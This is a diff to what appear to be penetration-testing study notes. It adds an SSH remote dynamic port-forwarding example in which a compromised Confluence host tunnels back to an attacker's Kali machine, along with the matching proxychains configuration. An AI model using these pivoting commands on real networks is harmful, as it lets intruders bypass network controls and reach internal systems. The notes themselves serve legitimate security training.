@@ -43,10 +43,23 @@ kali@kali(attacker machine):~$ tail /etc/proxychains4.conf
 socks5 192.168.50.63 9999(remote compromised machine - confluence01)
 ```
 ###### SSH Remote Dynamic Port Forwarding 
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/118dc119-bbce-4559-8ec6-5b1c1b7e50f5)
+
 Remote Dynamic Port Forwarding:
-initiating an SSH connection from a remote compromised host(which is 192.168.118.4)
+initiating an SSH connection from a remote compromised host(confluence to attacker machine)
 ```
-remote compromised machine: ssh -N -R 9998(src from local loopback interface) kali@192.168.118.4(dst)
+remote compromised machine(confluence01): ssh -N -R 9998 kali@192.168.118.4
+
+kali@kali(attacker machine):~$ tail /etc/proxychains4.conf
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998(attacker machine)
 ```
 ###### httptunnel
 ```
